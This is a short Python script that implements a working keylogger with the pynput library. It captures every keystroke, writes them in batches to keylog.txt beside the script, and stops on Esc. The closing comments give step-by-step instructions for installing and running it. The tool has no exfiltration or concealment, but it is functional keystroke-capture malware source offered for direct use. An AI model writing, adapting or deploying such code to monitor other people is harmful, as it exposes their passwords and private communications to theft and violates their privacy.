import os
from pynput import keyboard

class Keylogger:
    def __init__(self, log_file_name="keylog.txt"):
        # Determine the path of the log file in the same directory as the script
        self.log_file_path = os.path.join(os.path.dirname(__file__), log_file_name)
        
        # Create the log file if it doesn't exist
        self.create_log_file()
        
        # List to store the keys pressed
        self.keys = []
    
    def create_log_file(self):
        """
        Creates the log file if it does not exist.
        """
        if not os.path.exists(self.log_file_path):
            with open(self.log_file_path, "w") as f:
                f.write("Keylogger started...\n")
    
    def log_keys(self):
        """
        Logs the keys to the specified file.
        """
        with open(self.log_file_path, "a") as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
    
    def on_press(self, key):
        """
        This function is called whenever a key is pressed.
        """
        self.keys.append(key)
        if len(self.keys) >= 10:
            self.log_keys()
            self.keys.clear()
    
    def on_release(self, key):
        """
        This function is called whenever a key is released.
        """
        if key == keyboard.Key.esc:
            # Stop the listener and end the keylogger when the Esc key is pressed
            return False
    
    def start(self):
        """
        Starts the keylogger.
        """
        # Set up and start the listener for key presses and releases
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

# Instantiate the Keylogger class and start the keylogger
if __name__ == "__main__":
    # Create a Keylogger object
    keylogger = Keylogger()
    
    # Start the keylogger
    keylogger.start()

    # How to start the keylogger:
    # 1. Save this script as keylogger.py.
    # 2. Make sure you have the 'pynput' library installed. If not, install it using: pip install pynput
    # 3. Run the script by executing: python keylogger.py
    # 4. The keylogger will start capturing keystrokes and save them in the 'keylog.txt' file in the same directory.
    # 5. Press the Esc key to stop the keylogger.
